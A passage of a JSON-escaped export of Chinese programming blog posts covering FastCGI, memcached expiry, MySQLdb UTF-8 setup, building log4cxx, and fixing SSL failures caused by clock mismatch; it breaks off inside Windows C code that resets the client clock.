**\n\n<p>\n\u7f51\u7edc\u7ea7\uff0c\u6bcf\u8bf7\u6c42\u4e00\u8fde\u63a5\u3002CGI\u7684\u6539\u826f\uff0c\u91cd\u7528\u8fdb\u7a0b\uff0c\u8fdb\u7a0b\u5904\u7406\u5b8c\u4e00\u4e2a\u8bf7\u6c42\u540e\u518d\u5904\u7406\u4e0b\u4e00\u8bf7\u6c42\uff0c\u5bf9\u4e8e\u591a\u4e2a\u8bf7\u6c42\uff0c\u53ea\u9700\u8981\u4ed8\u51fa\u4e00\u6b21\u8fdb\u7a0b\u521b\u5efa\u7684\u5f00\u9500\uff0c\u53ef\u4ee5\u5728\u540e\u7ee7\u8bf7\u6c42\u91cd\u7528\u8d44\u6e90\uff08\u4ece\u6587\u4ef6\u8f7d\u5165\u7684\u914d\u7f6e\u9879\u3001\u67e5\u8be2\u5230\u7684\u6570\u636e\u3001\u6253\u5f00\u7684\u6587\u4ef6\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\uff09\u3002\u56e0\u4e3a\u5904\u7406\u7a0b\u5e8f\u662f\u4e32\u884c\u5904\u7406\u8bf7\u6c42\uff0c\u5f80\u5f80\u9700\u8981\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u5904\u7406\u7a0b\u5e8f\u4ee5\u63d0\u5347\u5e76\u53d1\u5904\u7406\u80fd\u529b\uff0c\u8fd9\u4e9b\u5904\u7406\u7a0b\u5e8f\u65e0\u6cd5\u5171\u4eab\u8d44\u6e90\u4ee5\u8fdb\u4e00\u6b65\u63d0\u5347\u6027\u80fd\u3002\n<\/p>\n<\/li>\n\n<li>\u9644\u5f55\n\n<p>\nWeb\u670d\u52a1\u5668\u53ef\u91cd\u7528\u5230\u670d\u52a1\u7a0b\u5e8f\u7684\u8fde\u63a5\u8fdb\u4e00\u6b65\u63d0\u5347\u6027\u80fd\uff08\u5982\uff1anginx\u7684<a href=\"http:\/\/nginx.org\/en\/docs\/http\/ngx_http_upstream_module.html#keepalive\">upstream_keepalive<\/a>\uff09\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">WSGI<\/h2>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">uWSGI<\/h2>\n<\/div>\n"
},
{
  "title": "memcached_get\u4f1a\u91cd\u7f6e\u8fc7\u671f\u65f6\u95f4\u5417\uff1f",
  "timestamp": "2012-11-13 20:29:00",
  "tags": [
    "memcached"
  ],
  "body": "<p>\n\u4e0d\u4f1a\u3002\u83b7\u53d6\u6570\u636e\u7684\u64cd\u4f5c\u4e0d\u4f1a\u5f71\u54cd\u6570\u636e\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u6700\u65b0\u7684memcache1.6\u6dfb\u52a0\u4e86touch\u548cGAT\uff08get and touch)\u547d\u4ee4\uff0c\u53ef\u4ee5\u5728\u83b7\u53d6\u6570\u636e\u65f6\u8fc7\u671f\u65f6\u95f4\u3002<\/p>\n"
},
{
  "title": "python\u4e2dMySQLdb\u4f7f\u7528utf-8\u5b57\u7b26\u96c6",
  "timestamp": "2011-04-29 01:22:00",
  "tags": [
    "python",
    "mysql"
  ],
  "body": "<dl class=\"org-dl\">\n<dt> \u8981\u907f\u514d\u4e71\u7801\u9700\u8981\u505a\u597d\u4ee5\u4e0b\u51e0\u70b9 <\/dt><dd><ul class=\"org-ul\">\n<li>python\u6e90\u4ee3\u7801\u4fdd\u5b58\u4e3autf-8\n<\/li>\n<li>\u6570\u636e\u5e93\u5efa\u6210utf-8\n<\/li>\n<li>mysql\u8fde\u63a5\u8bbe\u7f6e\u4e3autf-8\n<\/li>\n<li>\u67e5\u8be2\u7d50\u679c\u4e2d\u7684\u6587\u672c\u5b57\u6bb5\u662funicode\u7684\uff0c\u8f6c\u56deutf-8\n<\/li>\n<\/ul>\n<\/dd>\n\n<dt> \u603b\u7ed3\u6027\u7684\u793a\u4f8b\u4ee3\u7801 <\/dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/usr\/bin\/env python<\/span>\n<span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">-*- coding: utf-8 -*-<\/span>\n\n<span style=\"color: #99cc99;\">import<\/span> MySQLdb\n\n<span style=\"color: #99cc99;\">if<\/span> <span style=\"color: #cc99cc;\">__name__<\/span> == <span style=\"color: #66cccc;\">'__main__'<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">mysql<\/span> = MySQLdb.connect(host=<span style=\"color: #66cccc;\">'localhost'<\/span>, user=<span style=\"color: #66cccc;\">'root'<\/span>, passwd=<span style=\"color: #66cccc;\">'123456'<\/span>, char<span style=\"text-decoration: underline;\">set=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'utf8'<\/span><span style=\"text-decoration: underline;\">)<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">cursor<\/span> = mysql.cursor()\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(<span style=\"color: #66cccc;\">'SET NAMES UTF8'<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">sql<\/span> = <span style=\"color: #66cccc;\">'DROP DATABASE IF EXISTS mysqldb_utf8_test'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(sql)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">sql<\/span> = <span style=\"color: #66cccc;\">'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE <\/span><span style=\"color: #66cccc; text-decoration: underline;\">utf8_general_ci'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(sql)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">mysql<\/span> = MySQLdb.connect(host=<span style=\"color: #66cccc;\">'localhost'<\/span>, user=<span style=\"color: #66cccc;\">'root'<\/span>, passwd=<span style=\"color: #66cccc;\">'123456'<\/span>, db=<span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">mysqldb_utf8_test'<\/span><span style=\"text-decoration: underline;\">, charset=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'utf8'<\/span><span style=\"text-decoration: underline;\">)<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">cursor<\/span> = mysql.cursor()\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(<span style=\"color: #66cccc;\">'SET NAMES UTF8'<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">sql<\/span> = <span style=\"color: #66cccc;\">'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field V<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ARCHAR(255) NOT NULL)'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(sql)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">key<\/span> = <span style=\"color: #66cccc;\">'tangxinfa'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">value<\/span> = <span style=\"color: #66cccc;\">'&#22909;&#20154;&#19968;&#20010;'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">sql<\/span> = <span style=\"color: #66cccc;\">'INSERT INTO utf8_table VALUES(\"%s\", \"%s\")'<\/span>%(key, value)\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(sql)       <span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">&#27880;&#24847;&#26576;&#20123;&#26087;&#29256;&#26412;&#30340;mysql&#65288;&#22914;4.1.22&#20197;&#19979;&#65289;&#65292;mysql.character_set_name<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">()&#24635;&#26159;&#36820;&#22238;latin1&#65292;&#20250;&#24341;&#36215;&#20081;&#30721;&#65292;&#38656;&#35201;&#25913;&#20026;cursor.execute('INSERT INTO utf8_table VALUES(\"%s\", \"%s\")', (key, value))<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">sql<\/span> = <span style=\"color: #66cccc;\">'select * from utf8_table'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   cursor.execute(sql)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span> record <span style=\"color: #99cc99;\">in<\/span> cursor.fetchall():\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span> item <span style=\"color: #99cc99;\">in<\/span> record:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> item.encode(<span style=\"color: #66cccc;\">'utf8'<\/span>)\n<\/pre>\n<\/div>\n<\/dd>\n\n<dt> \u53c2\u8003 <\/dt><dd><ul class=\"org-ul\">\n<li><a href=\"http:\/\/mysql-python.sourceforge.net\/MySQLdb.html\">http:\/\/mysql-python.sourceforge.net\/MySQLdb.html<\/a>\n<\/li>\n<li><a href=\"http:\/\/bbs.phpchina.com\/viewthread.php?tid=13861\">http:\/\/bbs.phpchina.com\/viewthread.php?tid=13861<\/a>\n<\/li>\n<li><a href=\"http:\/\/hi.baidu.com\/ak456\/blog\/item\/c318502394aa20569922ed7b.html\">http:\/\/hi.baidu.com\/ak456\/blog\/item\/c318502394aa20569922ed7b.html<\/a>\n<\/li>\n<\/ul>\n<\/dd>\n<\/dl>\n"
},
{
  "title": "log4cxx\u4f7f\u7528\u5fc3\u5f97",
  "timestamp": "2008-06-17 10:01:00",
  "tags": [
    "log4cxx"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u7b80\u4ecb\n\n<p>\napache\u51fa\u54c1\u5fc5\u5c5e\u7cbe\u54c1\u3002\u6b63\u5b97c++\u65e5\u5fd7\u5e93\uff0c\u4e0elog4j\u4e00\u8109\u76f8\u627f\u3002\n<\/p>\n\n<p>\n<a href=\"http:\/\/logging.apache.org\/log4cxx\/index.html\">http:\/\/logging.apache.org\/log4cxx\/index.html<\/a>\n<\/p>\n<\/li>\n\n<li>\u4e0b\u8f7d\u3001\u7f16\u8bd1\u3001\u5b89\u88c5\n\n<p>\n\u6253\u7b97\u5b89\u88c5\u5230${HOME}\/libs\u76ee\u5f55\u4e0b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd<\/span> ~\/libs\nwget http:\/\/mirror.bjtu.edu.cn\/apache\/\/apr\/apr-1.4.4.tar.bz2\ntar xjvf apr-1.4.4.tar.bz2\n<span style=\"color: #cc99cc;\">cd<\/span> apr-1.4.4\n.\/configure --prefix=${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs &amp;&amp; make &amp;&amp; make install\n<span style=\"color: #cc99cc;\">cd<\/span> ..\nwget http:\/\/mirror.bjtu.edu.cn\/apache\/\/apr\/apr-util-1.3.11.tar.bz2\ntar xjvf apr-util-1.3.11.tar.bz2\n<span style=\"color: #cc99cc;\">cd<\/span> apr-util-1.3.11\n.\/configure --prefix=${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs --with-apr=${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs &amp;&amp; make &amp;&amp; make instal<span style=\"text-decoration: underline;\">l<\/span>\n<span style=\"color: #cc99cc;\">cd<\/span> ..\nwget http:\/\/apache.etoak.com\/\/logging\/log4cxx\/0.10.0\/apache-log4cxx-0.10.0.tar.g<span style=\"text-decoration: underline;\">z<\/span>\ntar xzvf apache-log4cxx-0.10.0.tar.gz\n<span style=\"color: #cc99cc;\">cd<\/span> apache-log4cxx-0.10.0\n.\/configure --with-charset=utf-8 --prefix=${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs --with-apr=${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs -<span style=\"text-decoration: underline;\">-with-apr-util=${<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">HOME<\/span><span style=\"text-decoration: underline;\">}\/libs &amp;&amp; make &amp;&amp; make install<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4f7f\u7528\u4f8b\u5b50\n\n<p>\n<code>hello.cpp<\/code> \uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-cpp\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">\"log4cxx\/logger.h\"<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">\"log4cxx\/propertyconfigurator.h\"<\/span>\n\n<span style=\"color: #99cc99;\">static<\/span> <span style=\"color: #6699cc;\">log4cxx<\/span>::<span style=\"color: #6699cc;\">LoggerPtr<\/span> <span style=\"color: #f99157;\">logger<\/span>(<span style=\"color: #6699cc;\">log4cxx<\/span>::<span style=\"color: #6699cc;\">Logger<\/span>::getLogger(<span style=\"color: #66cccc;\">\"hello\"<\/span>));\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n{\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #6699cc;\">log4cxx<\/span>::<span style=\"color: #6699cc;\">PropertyConfigurator<\/span>::configure(<span style=\"color: #66cccc;\">\".\/log4cxx_hello.properties\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span> LOG4CXX_INFO(logger, <span style=\"color: #66cccc;\">\"&#20320;&#22909;&#65292;log4cxx!\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n\n<p>\n<code>log4cxx_hello.properties<\/code> \uff1a\n<\/p>\n<pre class=\"example\">\nlog4j.rootLogger=debug, R\n\nlog4j.appender.stdout=org.apache.log4j.ConsoleAppender\nlog4j.appender.stdout.layout=org.apache.log4j.PatternLayout\n\n# Pattern to output the caller's file name and line number.\nlog4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n\n\nlog4j.appender.R=org.apache.log4j.RollingFileAppender\nlog4j.appender.R.File=.\/hello.log\n\nlog4j.appender.R.MaxFileSize=100KB\n# Keep one backup file\nlog4j.appender.R.MaxBackupIndex=10\n\nlog4j.appender.R.layout=org.apache.log4j.PatternLayout\nlog4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n\n<\/pre>\n\n<p>\n\u7f16\u8bd1\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">g++ -o hello hello.cpp -I${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs\/include ${<span style=\"color: #ffcc66;\">HOME<\/span>}\/libs\/lib\/liblog4cxx.a ${<span style=\"color: #ffcc66;\">HO<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ME<\/span><span style=\"text-decoration: underline;\">}\/libs\/lib\/libaprutil-1.a ${<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">HOME<\/span><span style=\"text-decoration: underline;\">}\/libs\/lib\/libapr-1.a  -lexpat -lpthread<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6ce8\u610f\u4e8b\u9879\n\n<p>\n\u7531\u4e8e\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\u5199\u6ee1\u540e\u4f1a\u91cd\u547d\u540d\u6240\u6709\u5df2\u6709\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u914d\u7f6e\u8fc7\u5927MaxBackupIndex\u7684\u4f1a\u6709\u6027\u80fd\u95ee\u9898\uff0c\u56e0\u6b64log4cxx\u7f16\u8bd1\u65f6\u9650\u5236\u4e86\u5b83\u7684\u5927\u5c0f\uff08\u5927\u6982\u5341\u591a\u4e2a\uff09\u4ee5\u907f\u514d\u914d\u7f6e\u7684MaxBackupIndex\u8fc7\u5927\uff0c\u5982\u679c\u8981\u8bbe\u7f6e\u66f4\u5927\u4e00\u70b9\u7684MaxFileSize\u6765\u4fdd\u5b58\u66f4\u591a\u65e5\u5fd7\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u524d\u8fdb\u884c\u4fee\u6539\u3002\n<\/p>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"http:\/\/objectmix.com\/apache\/684503-urgent-log4cxx-large-window-sizes-not-allowed.html\">http:\/\/objectmix.com\/apache\/684503-urgent-log4cxx-large-window-sizes-not-allowed.html<\/a>\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528\u6280\u5de7\n<ul class=\"org-ul\">\n<li>\u51b3\u5b9a\u914d\u7f6e\u6587\u4ef6\u7684\u683c\u5f0f\uff08xml\uff0cproperty\uff09\u3002\u4ee5\u4f7f\u7528\u76f8\u5e94\u7684\u914d\u7f6e\u5668\uff08Configurator\uff09\u88c5\u5165\u914d\u7f6e\u6587\u4ef6\u3002\n\n<p>\nxml\u867d\u8f83property\u683c\u5f0f\u7e41\u9501\uff0c\u652f\u6301\u7684\u914d\u7f6e\u9762\u66f4\u5168\uff0c\u800cproperty\u683c\u5f0f\u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u66f4\u7b80\u5355\uff0c\u5bb9\u6613\u5728\u7f51\u4e0a\u627e\u5230\u73b0\u6210\u7684\u914d\u7f6e\u6587\u4ef6\u3002\n<\/p>\n<\/li>\n\n<li>logger\u547d\u540d\n\n<p>\nlogger\u540d\u79f0\u53cd\u6620\u4e86\u8f6f\u4ef6\u6a21\u5757\uff0c\u5982\u679c\u6709\u4ee3\u8868\u8f6f\u4ef6\u6a21\u5757\u7684\u7c7b\uff0c\u5219\u5728\u7c7b\u4e2d\u5305\u542b\u4ee5\u8be5\u7c7b\u7c7b\u540d\u547d\u540d\u7684logger\u5bf9\u8c61\uff0c\u8be5\u6a21\u5757\u529f\u80fd\u76f8\u5173\u4ee3\u7801\u901a\u8fc7\u8be5logger\u8fdb\u884c\u65e5\u5fd7\u8bb0\u5f55\u3002\n\u53e6\u5916\u53ef\u5c06logger\u5bf9\u8c61\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\uff0c\u65b9\u4fbf\u4f7f\u7528\uff0c\u7279\u522b\u662f\u5f53\u8f6f\u4ef6\u6a21\u5757\u8f83\u677e\u6563\uff0c\u5e76\u65e0\u5bf9\u5e94\u7684\u5c01\u88c5\u7c7b\u65f6\u3002\n<\/p>\n<\/li>\n\n<li>\u5728\u4ee3\u7801\u4e2d\u9002\u5f53\u5730\u653e\u7f6e\u65e5\u5fd7\u4ee3\u7801\u3002\u5f15\u7528\u9002\u5f53\u7684\u65e5\u5fd7\u5bf9\u8c61\uff0c\u5bf9\u65e5\u5fd7\u8fdb\u884c\u9002\u5f53\u5206\u7ea7\u3002\n<\/li>\n\n<li>\u4f59\u4e0b\u7684\u5de5\u4f5c\u5c31\u662f\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u5bf9\u65e5\u5fd7\u8fdb\u884c\u63a7\u5236\u4e86\u3002\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n\n<p>\n\u3000\u3000\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u7684\u597d\u5904\u5c31\u662f\u53ef\u4ee5\u65b9\u4fbf\u5730\u914d\u7f6e\u65e5\u5fd7\u800c\u4e0d\u9700\u8981\u4fee\u6539\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u65b9\u4fbf\u914d\u7f6e\u65e5\u5fd7\u8fc7\u6ee4\u3001\u683c\u5f0f\u3001\u65e5\u5fd7\u76ee\u7684\u5730\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u4f53\u9a8c\n<\/li>\n<\/ul>\n\n<p>\n\u3000\u4e4b\u524d\u4ea7\u54c1\u4e2d\u7528\u5230\u7684\u662flog4cplus\uff0c\u4f46\u662f\u5e38\u5e38\u6709\u5199\u65e5\u5fd7\u5d29\u6e83\u7684\u60c5\u51b5\u51fa\u73b0\uff0c\u4f7f\u7528log4cxx\u6b63\u662f\u7528\u4e8e\u89e3\u51b3\u8be5\u5d29\u6e83\u3002<\/p>\n"
},
{
  "title": "SSL\u53cc\u65b9\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684SSL\u8fde\u63a5\u5931\u8d25\u53ca\u5176\u89e3\u51b3\u65b9\u6848",
  "timestamp": "2008-07-25 17:45:00",
  "tags": [
    "openssl",
    "c"
  ],
  "body": "<p>\n\u5728\u4ea7\u54c1\u4f7f\u7528\u4e2d\uff0c\u5b9e\u65bd\u4eba\u5458\u5e38\u5e38\u62a5\u544a\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u65e0\u6cd5\u8fde\u63a5\uff0c\u6700\u7ec8\u67e5\u660e\u539f\u56e0\u662f\u53cc\u65b9\u7684\u65f6\u95f4\u8bbe\u7f6e\u4e0d\u4e00\u81f4\u3002OpenSSL\u8bc1\u4e66\u6709\u4e00\u4e2a\u6709\u6548\u65f6\u95f4\u6bb5\uff0c\u5f53\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u65f6\u95f4\u4e0d\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u5185\u65f6SSL\u4f1a\u56e0\u8bc1\u4e66\u9a8c\u8bc1\u5931\u8d25\u800c\u65e0\u6cd5\u8fde\u63a5\u3002\u5728\u5b9e\u65bd\u4e2d\u7cfb\u7edf\u65f6\u95f4\u9519\u8bef\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u56e0\u4e0d\u80fd\u4e0a\u7f51\u800c\u672a\u5f00\u65f6\u95f4\u81ea\u52a8\u540c\u6b65\u3001bios\u6ca1\u7535\u4e86\u3001\u5ba2\u6237\u758f\u5ffd\u7b49\u539f\u56e0\u90fd\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u65f6\u95f4\u8bbe\u7f6e\u9519\u8bef\u3002\u5982\u679c\u8fde\u63a5\u5931\u8d25\u540e\u518d\u67e5\u770b\u7cfb\u7edf\u65f6\u95f4\u8bbe\u7f6e\u8fdb\u884c\u6545\u969c\u6392\u67e5\u7ec8\u5f52\u662f\u4e00\u4ef6\u9ebb\u70e6\u7684\u4e8b\u60c5\u3002\n<\/p>\n\n<p>\n\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529e\u6cd5\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5c06\u8bc1\u4e66\u7684\u6709\u6548\u671f\u8bbe\u7f6e\u5f97\u591f\u5927\uff08\u5982\uff1a1970-2099\uff09\n\n<p>\n\u8fd9\u6837\u4f30\u8ba1\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e0d\u8fc7\u8fd9\u4e5f\u662f\u4e2a\u998a\u4e3b\u610f\uff0c\u4e00\u822c\u7533\u8bf7\u7684\u8bc1\u4e66\u603b\u4f1a\u6709\u4e00\u4e2a\u5408\u7406\u7684\u6709\u6548\u671f\u3002\n<\/p>\n<\/li>\n\n<li>\u68c0\u6d4b\u53ca\u5fc5\u8981\u65f6\u81ea\u52a8\u540c\u6b65\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7684\u65f6\u95f4\n\n<p>\n\u901a\u8fc7\u7528wireshake\u6293\u5305\u5206\u6790SSL\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\uff0c\u53d1\u73b0\u5728SSL\u63e1\u624b\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u5411\u5bf9\u65b9\u4f20\u9001\u672c\u673a\u7684\u7cfb\u7edf\u65f6\u95f4\u3002\u56e0\u6b64\u4e00\u4e2a\u663e\u800c\u6613\u89c1\u7684\u529e\u6cd5\u5c31\u662f\uff0c\u5f53\u8fde\u63a5\u8fc7\u7a0b\u4e2d\u68c0\u6d4b\u5230\u8bc1\u4e66\u8fc7\u671f\uff0c\u5c06\u5ba2\u6237\u7aef\u7684\u65f6\u95f4\u540c\u6b65\u4e3a\u670d\u52a1\u5668\u7aef\u7684\u65f6\u95f4\uff0c\u518d\u91cd\u8fde\u5373\u53ef\u3002\n<\/p>\n\n<p>\n\u4e0b\u9762\u662f\u5177\u4f53\u7684\u793a\u4f8b\u4ee3\u7801\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;openssl\/ssl.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;openssl\/bio.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;openssl\/err.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;winsock2.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;stdio.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;string.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;time.h&gt;<\/span>\n\n<span style=\"color: #99cc99;\">typedef<\/span> <span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">_TimeInfo<\/span>\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">time_t<\/span> <span style=\"color: #ffcc66;\">client<\/span>;  <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">&#23458;&#25143;&#31471;&#30340;&#26102;&#38388;<\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">time_t<\/span> <span style=\"color: #ffcc66;\">server<\/span>;  <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">&#26381;&#21153;&#22120;&#30340;&#26102;&#38388;<\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n} <span style=\"color: #6699cc;\">TimeInfo<\/span>;\n\n<span style=\"color: #cc99cc;\">\/**<\/span>\n<span style=\"color: #cc99cc; background-color: #515151;\"> <\/span><span style=\"color: #cc99cc;\">* &#21516;&#27493;&#31995;&#32479;&#26102;&#38388;.<\/span>\n<span style=\"color: #cc99cc; background-color: #515151;\"> <\/span><span style=\"color: #cc99cc;\">*\/<\/span>\n<span style=\"color: #6699cc;\">BOOL<\/span> <span style=\"color: #f99157;\">syncSystemTime<\/span>(<span style=\"color: #6699cc;\">time_t<\/span> <span style=\"color: #ffcc66;\">t<\/span>)\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">SYSTEMTIME<\/span> <span style=\"color: #ffcc66;\">st<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">FILETIME<\/span>   <span style=\"color: #ffcc66;\">ft<\/span>;<span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">LONGLONG<\/span>   <span style=\"color: #ffcc66;\">ll<\/span>;<span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   ll = Int32x32To64(t, 10000000) + 116444736000000000; <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">1970.01.01<\/span><span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   ft.dwLowDateTime  = (<span style=\"color: #6699cc;\">DWORD<\/span>)ll;<span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   ft.dwHighDateTime = (<span style=\"color: #6699cc;\">DWORD<\/span>)(ll &gt;&gt; 32);<span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> FileTimeToSystemTime(&amp;ft, &amp;st) &amp;&amp; SetSystemTime(&amp;st);\n}\n\n<span style=\"color: #cc99cc;\">\/**<\/span>\n<span style=\"color: #cc99cc; background-color: #515151;\"> <\/span><span style=\"color: #cc99cc;\">* &#33719;&#21462;SSL&#25569;&#25163;&#36807;&#31243;&#20013;&#26381;&#21153;&#22120;&#19982;&#23458;&#25143;&#31471;&#21452;&#26041;&#30340;&#31995;&#32479;&#26102;&#38388;.<\/span>\n<span style=\"color: #cc99cc; background-color: #515151;\"> <\/span><span style=\"color: #cc99cc;\">*\/<\/span>\n<span style=\"color: #6699cc;\">void<\/span> <span style=\"color: #f99157;\">getSSLHandleShakeTimeInfo<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">write_p<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span 